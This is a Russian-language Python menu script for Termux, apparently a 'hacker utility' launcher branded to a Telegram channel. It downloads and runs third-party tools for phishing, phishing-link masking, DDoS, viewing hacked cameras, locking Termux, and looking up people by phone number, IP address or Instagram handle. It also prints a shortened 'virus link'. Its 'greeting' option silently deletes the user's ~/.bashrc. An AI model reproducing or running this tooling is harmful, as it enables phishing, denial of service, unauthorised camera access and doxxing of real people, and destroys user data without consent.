import os, time, webbrowser

from colorama import Fore, Style

print ('\n')
def res():
    print(Style.RESET_ALL)
    
while True:
    os.system('clear')
    print(Fore.RED+'[меню <утилиты>]')
    print(Fore.GREEN+'')
    print (" _                 _             _   _               ")
    print ("(_)  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print ("| | | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print ("| | | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print ("|_| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    print ("\n")
    print ("[telegram: @SYPEXHACK]                       [v2.4.0]")
    res()
    print (Fore.YELLOW+"    [1] тунелирование <ngrok>")
    print (Fore.YELLOW+"    [2] тунелирование <localhost>")
    print (Fore.YELLOW+"    [3] фишинг")
    print (Fore.YELLOW+"    [4] ддос")
    print (Fore.YELLOW+"    [5] приветствие")
    print (Fore.YELLOW+"    [6] заблокировать Termux")
    print (Fore.YELLOW+"    [7] просмотр взломаных камер")
    print (Fore.YELLOW+"    [8] получить вирус ссылку")
    print (Fore.YELLOW+"    [9] замаскировать фишинг")
    print (Fore.YELLOW+"    [10] пробив по номеру")
    print (Fore.YELLOW+"    [11] пробив по ip")
    print (Fore.YELLOW+"    [12] пробив инстаграм [BETA] ")
    print (Fore.CYAN+"\n                                     ╔═════════════╗")
    print (Fore.CYAN+'    [77] поддержка автора            ║'+Fore.GREEN+'>утилиты<'+Fore.CYAN+'[91]║')
    print (Fore.CYAN+'    [88] тг канал автора             ║'+Fore.YELLOW+' забавы '+Fore.CYAN+' [92]║')
    print (Fore.CYAN+'    [99] тех поддержка               ║'+Fore.YELLOW+' файлы  '+Fore.CYAN+' [93]║')
    print (Fore.CYAN+'    [00] выход                       ╚═════════════╝')
    res()
    inp = input ('  Выбери пункт>>> ')
    os.system('clear')

    if inp == '91':
        os.system('clear')
        

    if inp == '92':
        os.system('clear')
        os.system('python3 zabava.py')
        

    if inp == '93':
        os.system('clear')
        os.system('python3 fail.py')
       

        
    if inp == '1':
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_6 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_6 == 'y':
            os.system('pkg install nodejs-lts -y')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('npm install ngrok')
            os.system('clear')
            os.system('npm install ngrok -g')
            os.system('clear')
            print ('[установка нужных файлов]')
            we  = '8080'
            time.sleep(3)
            os.system('clear')
            print('[<ngrok> стандартный порт 8080]')
            tru_5 = input('\n Изменить порт? [y/n] >>> ')
            if tru_5 == 'y':
                os.system('clear')
                we_2 = input('Введите порт>>> ')
                if we_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+we+']')
                    time.sleep(4)
                    os.system('clear')
                    os.system('ngrok http '+we)
                else:
                    os.system('clear')
                    os.system('ngrok http '+we_2)

            if tru_5 == 'n':
                os.system('clear')
                os.system('ngrok http '+we)
            else:
                os.system('clear')
                os.system('ngrok http '+we)

        if tru_6 == 'n':
            os.system('clear')
            print(Fore.RED+'[пожалуйста включите моб. Точку доступа и повторите]')
            time.sleep(3)
        else:
            os.system('clear')
     


    if inp == '2':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_2 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_2 == 'y':
            print ('[установка нужных файлов]')
            time.sleep(3)
            
            os.system('pkg install dropbear -y')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('pkg install openssh -y')
            os.system('clear')
            qw = '8080'
            
            print('[<localhost> стандартный порт:8080]')
            tru_3 = input('\n Изменить порт? [y/n] >>> ')
            if tru_3 == 'y':
                os.system('clear')
                qw_2 = input('Введите порт>>> ')
                if qw_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+qw+']')
                    time.sleep(4)
                    os.system('clear')
                    print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                    print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
                    print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                    res()
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                else:
                    os.system('clear')
                    print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                    print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
                    print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                    res()
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run')

            if tru_3 == 'n':
                os.system('clear')
                print(Fore.GREEN+'[Ваша ссылка находится в самом нижнем ряде]')
                print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
                print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                res()
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
            else:
                os.system('clear')
                print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                print(Fore.YELLOW+'[есле ссылка не появилась а последний символ')
                print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                res()
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                
        if tru_2 == 'n':
            os.system('clear')
            print(Fore.RED+'[пожалуйста включите моб. Точку доступа и повторите]')
            time.sleep(3)
            pass
        else:
            os.system('clear')



    if inp == '3':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru == 'y':
            os.system('git clone https://github.com/KasRoudra/PyPhisher')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('clear')
            os.chdir('PyPhisher')
            os.system('python3 pyphisher.py')
        if tru == 'n':
            os.system('clear')
            pass
        else:
            os.system('clear')


    if inp == '4':    
        os.system('clear')
        os.system('pkg install dropbear -y')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('pkg install openssh -y')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('git clone https://github.com/lamer112311/Doser')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear')
        os.chdir('Doser')
        os.system('bash install.sh')
        os.system('clear')
        os.system('python doser.py')


    if inp == '5':   
        tt = 'привет'
        os.system('clear')
        os.system('rm ~/.bashrc')
        os.system('clear')
        print(Fore.YELLOW+'[стили текста]')
        res()
        print(Fore.CYAN+'[1] метал')
        print(Fore.CYAN+'[2] радуга')
        res()
        inp_32 = input ('Выбери пункт>>> ')
        os.system('clear')
        if inp_32 == '1':
            print(Fore.YELLOW+'[напишите текст]')
            print('[совет: используйте не более 8 символов]')
            res()
            tt = input ('>>>')
            os.system('clear')
            os.system('echo "clear" >> ~/.bashrc')
            os.system('echo "toilet -f mono9 -F metal '+tt+'" >> ~/.bashrc')
            os.system('echo "echo [telegram @sypexhack желает вам хорошего дня]" >> ~/.bashrc')
            os.system('clear')
            print('[готово]')
            time.sleep(3)


        if inp_32 == '2':
            print(Fore.YELLOW+'[напишите текст]')
            print('[совет: используйте не более 8 символов]')
            res()
            tt = input ('>>>')
            os.system('clear')
            os.system('echo "clear" >> ~/.bashrc')
            os.system('echo "toilet -f mono9 -F gay '+tt+'" >> ~/.bashrc')
            os.system('echo "echo [telegram @sypexhack желает вам хорошего дня]" >> ~/.bashrc')
            os.system('clear')
            print('[готово]')
            time.sleep(3)
        else:
            os.system('clear')


    if inp == '6':   
        os.system('git clone https://github.com/fuckwbored/termuxman')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear') 
        os.chdir('termuxman')
        os.system('python3 termuxman.py')


    if inp == '7':    
        os.system('pip install requests')
        os.system('clear')
        os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear') 
        os.chdir('Cam-Hackers')
        os.system('chmod +x *')
        os.system('python cam-hackers.py')
        tsu_44 = input('[нажмите entr чтобы выйти]')
        if tsu_44 =='':
            os.system('clear')
        else:
            os.system('clear')


    if inp == '8':
        os.system('clear')
        print('[Генерируется ссылка...]')
        time.sleep(3)
        os.system('clear')
        print('ваша ссылка')
        print("\n")
        print('https://bit.ly/3ild93L')
        print("\n")
        tru_8 = input('нажмите entr чтобы проложить')
        if tru_8 == 'y':
            os.system('clear')
            pass
        else:
            os.system('clear')       


    if inp == '9':
        os.system('git clone https://github.com/jaykali/maskphish.git')
        os.chdir('maskphish')
        os.system('clear')
        print('[Инструкция:В первый ряд вводим вашу фишинг ссылку.')
        print('В второй ряд  вводим ссылку которую мы хотим получить,')
        print('пример: https://Instagram.com В третьем ряде нажимаем entr.')
        print('В итоге получаем редирект ссылку, которая выглядит')
        print('более менее нормально.]')
        time.sleep(10)
        os.system('bash maskphish.sh')
        tsu_14 = input('[нажмите entr чтобы выйти]')
        if tsu_14 =='':
            os.system('clear')
        else:
            os.system('clear')


    if inp == '10':
        at = '1'
        print('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear')
        os.system('git clone https://github.com/Wes974/PhoneInfoga')
        os.chdir('PhoneInfoga')
        os.system('pip install -r requirements.txt')
        os.system('clear')
        print('[Введите номер телефона в формате: +(код)##########]')
        print('[Пример: +71237689098]')
        at = input('\n Введите номер >>> ')
        if at == '':
            os.system('clear')
            print('[вы ничего не ввели]')
            time.sleep(3)
        else:
            os.system('clear')
            os.system('python phoneinfoga.py -n '+at)
            tsu_14 = input('[нажмите entr чтобы выйти]')
            if tsu_14 =='':
                os.system('clear')
            else:
                os.system('clear')


    if inp == '11':
        os.system('pip install requests')
        os.system('clear')
        print('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear')
        os.system('git clone https://github.com/MrProCatYT/Uti-lite')
        os.chdir('Uti-lite')
        os.system('clear')
        os.system('python Uti-lite.py')
        os.system('clear')


    if inp == '12':
        aa = 'ververa'
        os.system('clear')
        print('[установка нужных файлов]')
        time.sleep(3)
        os.chdir('osi.ig')
        os.system('clear')
        print(Fore.GREEN+'[Введите ник в инстаграм]')
        print(Fore.CYAN+'[Пример: ververa]')
        res()
        aa = input('Введите ник>>> ')
        if aa == '':
            os.system('clear')
            print('[вы ничего не ввели]')
            time.sleep(3)
            os.system('python3 installer.py')
        else:
            os.system('clear')
            os.system('python3 main.py -u '+aa)
            tsu_24 = input('[нажмите entr чтобы выйти]')
            if tsu_24 =='':
                os.system('python3 installer.py')
            else:
                os.system('python3 installer.py')
            


    if inp == '77':
        os.system('xdg-open https://www.donationalerts.com/r/legends_never_die')


    if inp == '99':    
        os.system('xdg-open https://t.me/MR_FOXik')
        os.system('clear')
        

    if inp == '88':
        os.system('xdg-open https://t.me/SYPEXHACK')
        os.system('clear')


    if inp == '00':
        os.system('clear')
        print('Спасибо за использование [installer]')
        break
